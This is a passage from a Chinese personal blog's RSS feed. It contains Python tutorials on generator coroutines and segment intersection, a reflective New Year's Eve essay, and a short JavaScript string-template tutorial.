function_">long_add</span>(<span class="hljs-params">x, y, duration=<span class="hljs-number">1</span></span>):</span><br><span class="line">    <span class="hljs-keyword">yield</span> sleep(duration)</span><br><span class="line">    <span class="hljs-keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@coroutine</span></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">duration</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start:&#x27;</span>, time())</span><br><span class="line">    <span class="hljs-built_in">print</span>((<span class="hljs-keyword">yield</span> long_add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, duration)), time())</span><br><span class="line">    <span class="hljs-built_in">print</span>((<span class="hljs-keyword">yield</span> long_add(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, duration)), time())</span><br><span class="line"></span><br><span class="line">task(<span class="hljs-number">2</span>)</span><br><span class="line">task(<span class="hljs-number">1</span>)</span><br><span class="line">runner.run()</span><br></pre></div></div><p >由于我们使用了一个糟糕的事件轮询机制，密集的计算会阻塞通往 <code>stdout</code> 的输出，因而看起来所有的结果都是一起打印出来的。为此，我在打印时特地加上了时间戳，以演示协程的效果。输出如下：</p><div class="gk-code hljs" data-gk-id="BLOCK20"><div class="gk-code-display"><pre><span class="line">start: 1459609512.263156</span><br><span class="line">start: 1459609512.263212</span><br><span class="line">3 1459609513.2632613</span><br><span class="line">3 1459609514.2632234</span><br><span class="line">7 1459609514.263319</span><br><span class="line">7 1459609516.2633028</span><br></pre></div></div><p >这事实上是 <code>tornado.gen.coroutine</code> 的简化版本，为了叙述方便我略去了许多细节，如异常处理以及调度优化，目的是让大家能较清晰地了解 生成器协程 背后的机制。因此，<strong>这段代码并不能用于实际生产中</strong>。</p><h2 id="小结-1">小结</h2><ul><li>这，才叫精通生成器。</li><li>学习编程，不仅要知其然，亦要知其所以然。</li><li>Python 是有魔法的，只有想不到，没有做不到。</li></ul><h2 id="references">References</h2><ul><li><a href="https://github.com/tornadoweb/tornado/blob/master/tornado/gen.py#L245">tornado.gen.coroutine</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Generator/">Generator</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Coroutine/">Coroutine</category>
      
      
      <comments>https://i.hsfzxjy.site/python-generator-coroutine/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>数学美 之 判断线段相交的最简方法</title>
      <link>https://i.hsfzxjy.site/the-simplest-way-to-find-out-if-two-segments-are-intersected/</link>
      <guid>https://i.hsfzxjy.site/the-simplest-way-to-find-out-if-two-segments-are-intersected/</guid>
      <pubDate>Thu, 18 Feb 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;par&quot;&gt; 解析几何的巅峰
是 向量
那无关过程的狂妄与简洁
映射着大自然无与伦比的美&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;引子-1&quot;&gt;引子&lt;/h2&gt;
&lt;p &gt;如何判断两条直线是否相交？&lt;/p&gt;
&lt;p &gt;这很容易。平</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="par"> 解析几何的巅峰是 向量那无关过程的狂妄与简洁映射着大自然无与伦比的美</p></blockquote><h2 id="引子-1">引子</h2><p >如何判断两条直线是否相交？</p><p >这很容易。平面直线，无非就是两种关系：相交 或 平行。因此，只需判断它们是否平行即可。而直线平行，等价于它们的斜率相等，只需分别计算出它们的斜率，即可做出判断。</p><p >但倘若我把“直线”换成“线段”呢——如何判断两条线段是否相交？</p><p >这就有些难度了。和 直线 不同，线段 是有固定长度的，即使它们所属的两条直线相交，这两条线段也不一定相交。</p><p >也许你会说：分情况讨论不就行了嘛：</p><ul><li>先计算两条线段的斜率，判断是否平行。若平行，则一定不相交。</li><li>若不平行，求出两条线段的直线方程，联立之，解出交点坐标。</li><li>运用定比分点公式，判断交点是否在两条线段上。</li></ul><p >的确，从理论上这是一个可行的办法，这也是人们手动计算时普遍采用的方法。</p><p >然而，这个方法并不怎么适用于计算机。原因如下：</p><ul><li>计算中出现了除法（斜率计算、定比分点），因此每次计算前都要判断除数是否为 0（或接近 0）。这很麻烦，严重干扰逻辑的表达。</li><li>浮点精度丢失带来的误差。人类计算时可以采用分数，但计算机不行。计算机在储存浮点数时会有精度丢失的现象。一旦算法的计算量大起来，误差会被急剧放大，影响结果准确性。</li><li>效率低下。浮点乘除会十分耗时，不适用于对实时性要求较高的生产环境（如 游戏）。</li></ul><p  class="noindent"> 那么，有更好的方法？</p><p  class="noindent"> 当然有。</p><h2 id="类型预定义">类型预定义</h2><p >本文的算法将用 python 描述，主要用到两个数据类型：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># 点</span></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x, y</span>):</span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 向量</span></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, start_point, end_point</span>):</span><br><span class="line">        self.start, self.end = start_point, end_point</span><br><span class="line">        self.x = end_point.x - start_point.x</span><br><span class="line">        self.y = end_point.y - start_point.y</span><br></pre></div></div><p  class="par"> 先在此处说明。</p><h2 id="问题分析">问题分析</h2><p >对于“判断两条直线是否相交”这个问题，我们之所以能迅速而准确地进行判断，是因为“相交”与“不相交”这两个状态有着明显的不同点，即 <strong>斜率是否相等</strong>。</p><p >那么现在，为了判断两条线段是否相交，我们也要找出“相交”与“不相交”这两个状态的不同点。</p><p >假设现在有两条线段 AB 和 CD，我们画出它们之间的三种关系：</p><ol><li><img loading="lazy" src="https://segmentfault.com/img/bVsRnf" alt="不相交"></li><li><img loading="lazy" src="https://segmentfault.com/img/bVsRmQ" alt="交点位于某条线段上"></li><li><img loading="lazy" src="https://segmentfault.com/img/bVsRnh" alt="相交"></li></ol><p >其中，情况 1 为不相交，情况 2、3 为相交。</p><p >作出向量 AC、AD、BC、BD。</p><p >首先介绍一个概念： <strong>向量有序对的旋转方向</strong>。这个概念指：对于共起点有序向量二元组<code>(a, b)</code>，其旋转方向为 <strong>使 a 能够旋转一个小于 180 度的角并与 b 重合的方向</strong>，简记为 <code>direct(a, b)</code>。若 <code>a</code> 和 <code>b</code> 反向共线，则旋转方向取任意值。</p><p >举个例子：图一中，<code>direct(AC, AD)</code> 为顺时针方向。</p><p >接下来我们要分析四个值：<code>direct(AC, AD)</code>、<code>direct(BC, BD)</code>、<code>direct(CA, CB)</code>、<code>direct(DA, DB)</code>。</p><ol><li>对于图一，<code>direct(AC, AD)</code> 和 <code>direct(BC, BD)</code> 都为顺时针，<code>direct(CA, CB)</code> 为逆时针，<code>direct(DA, DB)</code> 为顺时针。</li><li>对于图二，<code>direct(AC, AD)</code> 为顺时针，<code>direct(BC, BD)</code> 为任意方向，<code>direct(CA, CB)</code> 为逆时针，<code>direct(DA, DB)</code> 为顺时针。</li><li>对于图三，<code>direct(AC, AD)</code>、<code>direct(DA, DB)</code> 为顺时针，<code>direct(BC, BD)</code>、<code>direct(CA, CB)</code> 为逆时针。</li></ol><p >不难发现，两条线段相交的充要条件是：<code>direct(AC, AD) != direct(BC, BD)</code> 且 <code>direct(CA, CB) != direct(DA, DB)</code>。这便是“相交”与“不相交”这两个状态的不同点。</p><p >然而你可能会觉得：旋转方向这么一个虚无飘渺的东西，怎么用程序去描述啊？</p><p >再来看一幅图：</p><p ><img loading="lazy" src="https://segmentfault.com/img/bVsRna" alt=""></p><p >再来定义有向角：</p><blockquote><p >有向角 <code>&lt;a, b&gt;</code> 为 向量<code>a</code> <strong>逆时针</strong> 旋转到与 向量<code>b</code> 重合所经过的角度。</p></blockquote><p >不难看出，对于向量<code>a</code>、<code>b</code>：</p><ul><li>若 <code>direct(a, b)</code> 为逆时针，则 <code>0 &lt;= &lt;a, b&gt; &lt;= 180</code>，从而 <code>sin&lt;a, b&gt; &gt;= 0</code>。</li><li>若 <code>direct(a, b)</code> 为顺时针，则 <code>180 &lt;= &lt;a, b&gt; &lt;= 360</code>，从而 <code>sin&lt;a, b&gt; &lt;= 0</code>。</li></ul><p >这样一来，我们可以将旋转方向的问题转化为 <strong>求有向角正弦值</strong> 的问题。而这个问题，是很容易的。</p><p >如上图，记</p><p >$$ OA = (x_1, y_1), OB = (x_2, y_2) $$$$ |OA| = r_1, |OB| = r_2 $$</p><p >则</p><p >$$ sin(\lt OA, OB\gt) $$$$ = sin \theta $$$$ = sin (\beta - \alpha) $$$$ = sin \beta cos \alpha - sin \alpha cos \beta $$$$ = \frac{(sin \beta cos \alpha - sin \alpha cos \beta)  r_1  r_2}{r_1  r_2} $$$$ = {(x_1  y_2 - x_2  y_1) \over (r_1  r_2)} $$</p><p >而这里，我们要的只是 <code>sin(&lt;OA, OB&gt;)</code> 的符号，而 <code>r1</code> 和 <code>r2</code> 又都是恒正的，因此只需判断 <code>x1 * y2 - x2 * y1</code> 的符号即可。</p><p >这个方法的数学背景是 <strong>叉乘</strong>，可以前往 <a href="https://zh.wikipedia.org/wiki/%E5%90%91%E9%87%8F%E7%A7%AF">Wikipedia</a> 了解更多。</p><h2 id="思路小结">思路小结</h2><ul><li>由点 A，B，C，D 计算出向量 AC，AD，BC，BD</li><li>计算 <code>sin(&lt;AC, AD&gt;) * sin(&lt;BC, BD&gt;)</code> 和 <code>sin(&lt;CA, CB&gt;) * sin(&lt;DA, DB&gt;)</code>，若皆为非正数，则相交；否则，不相交。</li></ul><h2 id="实现-1">实现</h2><p >终于到代码部分了，想必大家都已不耐烦了吧。</p><p >在向量的辅助下，代码显得异常简单。</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">ZERO = <span class="hljs-number">1e-9</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">negative</span>(<span class="hljs-params">vector</span>):</span><br><span class="line">    <span class="hljs-string">&quot;&quot;&quot;取反&quot;&quot;&quot;</span></span><br><span class="line">    <span class="hljs-keyword">return</span> Vector(vector.end_point, vector.start_point)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">vector_product</span>(<span class="hljs-params">vectorA, vectorB</span>):</span><br><span class="line">    <span class="hljs-string">&#x27;&#x27;&#x27;计算 x_1 * y_2 - x_2 * y_1&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="hljs-keyword">return</span> vectorA.x * vectorB.y - vectorB.x * vectorA.y</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_intersected</span>(<span class="hljs-params">A, B, C, D</span>):</span><br><span class="line">    <span class="hljs-string">&#x27;&#x27;&#x27;A, B, C, D 为 Point 类型&#x27;&#x27;&#x27;</span></span><br><span class="line">    AC = Vector(A, C)</span><br><span class="line">    AD = Vector(A, D)</span><br><span class="line">    BC = Vector(B, C)</span><br><span class="line">    BD = Vector(B, D)</span><br><span class="line">    CA = negative(AC)</span><br><span class="line">    CB = negative(BC)</span><br><span class="line">    DA = negative(AD)</span><br><span class="line">    DB = negative(BD)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> (vector_product(AC, AD) * vector_product(BC, BD) &lt;= ZERO) \</span><br><span class="line">        <span class="hljs-keyword">and</span> (vector_product(CA, CB) * vector_product(DA, DB) &lt;= ZERO)</span><br></pre></div></div><p >一气呵成，没有恼人的除法，没有情况讨论，只是纯粹的简单运算。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      
      <comments>https://i.hsfzxjy.site/the-simplest-way-to-find-out-if-two-segments-are-intersected/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>除夕杂感</title>
      <link>https://i.hsfzxjy.site/thinking-in-the-day-before-lunar-new-year-of-2016/</link>
      <guid>https://i.hsfzxjy.site/thinking-in-the-day-before-lunar-new-year-of-2016/</guid>
      <pubDate>Fri, 12 Feb 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;!--## 一--&gt;

&lt;p &gt;直到下午四点，供桌才摆上。&lt;/p&gt;
&lt;p &gt;冒着热气的鸡，整只；两尾鱼，张着嘴卧在盘中；一摞柑，愣是叠成了宝塔的形状；此外，还有一包包花花绿绿的零食。一米见方的桌子被塞得满满的，全是贡品。&lt;/p&gt;
&lt;p &gt;母亲忙得团团转。本来是不想拜天公的，但转</description>
        
      
      
      
      <content:encoded><![CDATA[<!--## 一--><p >直到下午四点，供桌才摆上。</p><p >冒着热气的鸡，整只；两尾鱼，张着嘴卧在盘中；一摞柑，愣是叠成了宝塔的形状；此外，还有一包包花花绿绿的零食。一米见方的桌子被塞得满满的，全是贡品。</p><p >母亲忙得团团转。本来是不想拜天公的，但转念一想，不是太好，便摆上了。阳光下，热气一直往上冒，往上冒，直到看不见的地方——那里，想必就住着那位神。</p><p >看来，这位神一定是个重要人物了——不然，母亲怎会遗忘了其他的几位，而只供奉他一个？</p><p >搬家之前，家里可还是住着许多神的：门口有一个，阳台上有一个，厨房有一个，抽屉下有一个，就连洗衣机上也有一个。听母亲说：每一家都有，每一位神，都在守卫着这个家。</p><p >神们也不是白干活，也是要吃饭的。不只是过年，每个月中总有那么几天，神们会一起来要吃的。每到这时，母亲便会忙活起来，为他们张罗吃的。好在他们并不挑剔——生的，熟的，速食的，神们都默默地收下了。当然，贡品在屋子里转了一圈，自然又都进到了我们的肚子里。</p><p >每换一个地方，母亲便上一炷香，虔诚地跪下来，轻轻地拜两拜，口中念念有词。</p><p >接着，她又拉我一起来。</p><p >我不懂，她便教我——想着自己想要的事就好了。</p><p >我学着样子跪下来，胡乱说了几句，装模作样地拜了两拜，余光却仍盯着那食物。</p><p >听母亲说，这是老家带来的习俗。对神的敬畏，在那个古老的地方，说着那古老语言的人们，已经沿袭了很久很久了。</p><p >人终是怕神的——以前是，现在也是；中国是，外国也是。神像一群喜欢偷窥的人，在这里，也在那里，在每个角落偷窥着你。你受欺负时，神会给你庇护；你做坏事时，神会予你惩罚。因此，怕神的人，多是善良的。</p><p >说是怕神，倒不如说是怕天，敬畏变幻莫测的未知。活物总是怀着对死亡的恐惧，人类也不例外。未知中蕴藏着杀机，使愚昧的人类感到不安，转而求助于那假象中的造物主，那超能力者，那个开着全局视角看戏的“人”，这便成了“神”。神为人类抵挡着未知，人类也因此安分守己，深怕触犯了神，再次被暴露于未知的荒野中。</p><p >然而，神正在离去，因为未知正在散去。</p><p >但藏在那未知背后的是什么，谁又知道呢？未知的背后仍是未知，现实可以是虚幻，真理也可以是谬误，时间洪流夹带着未知，使任何人都只能屏息，任何人，都不可以妄自尊大。</p><p >好在，还有神——尽管神正在离去。</p><p >但终究，怕神的人是善良的。</p><!--## 二母亲跪在供桌前，红着眼圈，抽泣着。供桌背后，是明净的落地窗——厚重的窗帘已被拆下，在洗衣机里轰鸣着。透过窗子，可以看见这个城市，在阳光下闪着金光。与其说是在拜天公，倒不如说是在祭拜整个世界。物欲横流的世界。人们渐行渐远的世界。门外，父亲许久没有发声。母亲和父亲刚吵了一架。父亲又出去打麻将了，在除夕，家里只有母亲一个人在忙活。母亲措辞犀利，出言不逊，像是有憋了一整年的怨气。叫罢，便像孩子一样失声哭了起来。父亲自知理亏，一直没有发声。其实，父亲只是想娱乐一下而已。纷纷扰扰的世事，压迫着每一个人，谁都有烦恼的时候。或许，父亲只是把春节当成是一个稍长的假期罢了，但母亲不这么想。观念的分歧，引起了这场纠纷。-->]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/thinking-in-the-day-before-lunar-new-year-of-2016/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>17 行代码实现的简易 Javascript 字符串模板</title>
      <link>https://i.hsfzxjy.site/a-simple-javascript-template-language/</link>
      <guid>https://i.hsfzxjy.site/a-simple-javascript-template-language/</guid>
      <pubDate>Thu, 11 Feb 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;这是源于两年前，当我在做人生中第一个真正意义上的网站时遇到的一个问题。该网站采用前后端分离的方式，由后端的 REST 接口返回 JSON 数据，再由前端渲染到页面上。&lt;/p&gt;
&lt;p &gt;同许多初学 Javascript 的菜鸟一样，起初，我也是采用拼接字符串的形式，将 JS</description>
        
      
      
      
      <content:encoded><![CDATA[<p >这是源于两年前，当我在做人生中第一个真正意义上的网站时遇到的一个问题。该网站采用前后端分离的方式，由后端的 REST 接口返回 JSON 数据，再由前端渲染到页面上。</p><p >同许多初学 Javascript 的菜鸟一样，起初，我也是采用拼接字符串的形式，将 JSON 数据嵌入 HTML 中。开始时代码量较少，暂时还可以接受。但当页面结构复杂起来后，其弱点开始变得无法忍受起来：</p><ul><li><strong>书写不连贯</strong>。每写一个变量就要断一下，插入一个 <code>+</code> 和 <code>&quot;</code>。十分容易出错。</li><li><strong>无法重用</strong>。HTML 片段都是离散化的数据，难以对其中重复的部分进行提取。</li><li><strong>无法很好地利用 <code>&lt;template&gt;</code> 标签</strong>。这是 HTML5 中新增的一个标签，标准极力推荐将 HTML 模板放入 <code>&lt;template&gt;</code> 标签中，使代码更简洁。</li></ul><p >为了解决这个问题，我暂时放下了手上的项目，花了半个小时实现一个极简易的字符串模板。</p><h2 id="需求描述-1">需求描述</h2><p >实现一个 <code>render(template, context)</code> 方法，将 <code>template</code> 中的占位符用 <code>context</code> 填充。要求：</p><ol><li>不需要有控制流成分（如 循环、条件 等等），只要有变量替换功能即可</li><li>级联的变量也可以展开</li><li>被转义的的分隔符 <code>&#123;</code> 和 <code>&#125;</code> 不应该被渲染，分隔符与变量之间允许有空白字符</li></ol><p >例子：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;My name is {name}&#x27;</span>， {</span><br><span class="line">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;hsfzxjy&#x27;</span></span><br><span class="line">});  <span class="hljs-comment">// My name is hsfzxjy</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;I am in {profile.location}&#x27;</span>, {</span><br><span class="line">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;hsfzxjy&#x27;</span>,</span><br><span class="line">    <span class="hljs-attr">profile</span>: {</span><br><span class="line">        <span class="hljs-attr">location</span>: <span class="hljs-string">&#x27;Guangzhou&#x27;</span></span><br><span class="line">    }</span><br><span class="line">}); <span class="hljs-comment">// I am in Guangzhou</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;{ greeting }. \\{ This block will not be rendered }&#x27;</span>, {</span><br><span class="line">    <span class="hljs-attr">greeting</span>: <span class="hljs-string">&#x27;Hi&#x27;</span></span><br><span class="line">}); <span class="hljs-comment">// Hi. { This block will not be rendered }</span></span><br></pre></div></div><h2 id="实现">实现</h2><p >先写下函数的框架：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">template, context</span>) {</span><br><span class="line"></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> 显然，要做的第一件事便是 <strong>匹配模板中的占位符</strong>。</p><h3 id="匹配占位符">匹配占位符</h3><p >匹配的事，肯定是交给正则表达式来完成。那么，这个正则表达式应该长什么样呢？</p><p  class="par"> 根据 需求 1、2 的描述，我们可以写出：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span> reg = <span class="hljs-regexp">/\{([^\{\}]+)\}/g</span>;</span><br></pre></div></div><p  class="par"> 至于需求 3，我第一个想到的概念是 <strong>前向匹配</strong>，可惜 Javascript 并不支持，只好用一个折衷的办法：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span> reg = <span class="hljs-regexp">/(\\)?\{([^\{\}\\]+)(\\)?\}/g</span>;</span><br><span class="line"><span class="hljs-comment">// 若是第一个或第三个分组值不为空，则不渲染</span></span><br></pre></div></div><p  class="par"> 现在，代码应该是这样：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">template, context</span>) {</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> tokenReg = <span class="hljs-regexp">/(\\)?\{([^\{\}\\]+)(\\)?\}/g</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(tokenReg, <span class="hljs-keyword">function</span> (<span class="hljs-params">word, slash1, token, slash2</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (slash1 || slash2) {  <span class="hljs-comment">// 匹配到转义字符</span></span><br><span class="line">            <span class="hljs-keyword">return</span> word.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// 如果 分隔符被转义，则不渲染</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// ...</span></span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></div></div><h3 id="占位符替换">占位符替换</h3><p >嗯，正则表达式确定了，接下来要做的便是替换工作。</p><p >根据 需求 2，模板引擎不仅要能渲染一级变量，更要渲染多级变量。这该怎么做呢？</p><p  class="nomargin"> 其实很简单：将 <code>token</code> 按 <code>.</code> 分隔开，逐级查找即可：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span> variables = token.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">// 切割 token</span></span><br><span class="line"><span class="hljs-keyword">var</span> currentObject = context;</span><br><span class="line"><span class="hljs-keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 逐级查找 context</span></span><br><span class="line"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, length = variables.<span class="hljs-property">length</span>; i &lt; length; ++i) {</span><br><span class="line">    variable = variables[i];</span><br><span class="line">    currentObject = currentObject[variable];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">return</span> currentObject;</span><br></pre></div></div><p  class="par"> 不过，有可能 <code>token</code> 指定的变量并不存在，这时上面的代码便会报错。为了更好的体验，代码最好有一定的容错能力：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span> variables = token.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">// 切割 token</span></span><br><span class="line"><span class="hljs-keyword">var</span> currentObject = context;</span><br><span class="line"><span class="hljs-keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, length = variables.<span class="hljs-property">length</span>; i &lt; length; ++i) {</span><br><span class="line">    variable = variables[i];</span><br><span class="line">    currentObject = currentObject[variable];</span><br><span class="line">    <span class="hljs-keyword">if</span> (currentObject === <span class="hljs-literal">undefined</span> || currentObject === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// 如果当前索引的对象不存在，则直接返回空字符串。</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">return</span> currentObject;</span><br></pre></div></div><p  class="par"> 把所有的代码组合在一起，便得到了最终的版本：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">template, context</span>) {</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> tokenReg = <span class="hljs-regexp">/(\\)?\{([^\{\}\\]+)(\\)?\}/g</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(tokenReg, <span class="hljs-keyword">function</span> (<span class="hljs-params">word, slash1, token, slash2</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (slash1 || slash2) {</span><br><span class="line">            <span class="hljs-keyword">return</span> word.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">var</span> variables = token.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="hljs-keyword">var</span> currentObject = context;</span><br><span class="line">        <span class="hljs-keyword">var</span> i, length, variable;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, length = variables.<span class="hljs-property">length</span>; i &lt; length; ++i) {</span><br><span class="line">            variable = variables[i];</span><br><span class="line">            currentObject = currentObject[variable];</span><br><span class="line">            <span class="hljs-keyword">if</span> (currentObject === <span class="hljs-literal">undefined</span> || currentObject === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> currentObject;</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> 除去空白行，一共 17 行。</p><h2 id="将函数挂到-string-的原型链">将函数挂到 String 的原型链</h2><p >甚至，我们可以通过修改原型链，实现一些很酷的效果：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-title function_">render</span>(<span class="hljs-variable language_">this</span>, context);</span><br><span class="line">};</span><br></pre></div></div><p  class="par"> 之后，我们便可以这样调用啦：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-string">&quot;{greeting}! My name is { author.name }.&quot;</span>.<span class="hljs-title function_">render</span>({</span><br><span class="line">    <span class="hljs-attr">greeting</span>: <span class="hljs-string">&quot;Hi&quot;</span>,</span><br><span class="line">    <span class="hljs-attr">author</span>: {</span><br><span class="line">        <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;hsfzxjy&quot;</span></span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"><span class="hljs-comment">// Hi! My name is hsfzxjy.</span></span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/JavaScript/">JavaScript</category>
      
      <category domain="https://i.hsfzxjy.site/tags/String-Template/">String Template</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Regular-Expression/">Regular Expression</category>
      
      
      <comments>https://i.hsfzxjy.site/a-simple-javascript-template-language/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python“黑魔法”之 Meta Classes</title>
      <link>https://i.hsfzxjy.site/meta-class-in-python/</link>
      <guid>https://i.hsfzxjy.site/meta-class-in-python/</guid>
      <pubDate>Tue, 09 Feb 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在 &lt;code&gt;models.py&lt;/code&gt; 中随便定义一个 &lt;code&gt;Model&lt;/code&gt; 的子类，Django 便可以：</description>
        
      
      
      
